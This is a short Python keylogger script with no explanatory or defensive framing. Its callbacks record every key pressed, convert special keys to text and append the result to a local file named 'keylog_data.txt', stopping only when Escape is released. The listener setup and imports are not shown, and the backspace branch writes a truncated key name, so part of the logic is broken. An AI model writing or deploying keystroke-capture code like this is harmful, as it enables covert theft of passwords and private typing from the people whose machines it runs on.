# variables

keys = []
count = 0


def on_press(key):

    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1 :
        count = 0
        write_file(keys)
        keys = []

def write_file(keys): 
    with open("keylog_data.txt", 'a') as f:     
        for key in keys:
            
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                f.write(" ")
            elif k.find('shift') > 0:
                f.write(' shift ')
            elif k.find('backspace') > 0:
                f.write(k[:-1])

            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')    
            elif k.find('enter') > 0:
                f.write('\n')
                
            elif k.find('Key') == -1:
                f.write(k)
                    
                    
def on_release (key):

    if str(key) == 'Key.esc':
        return False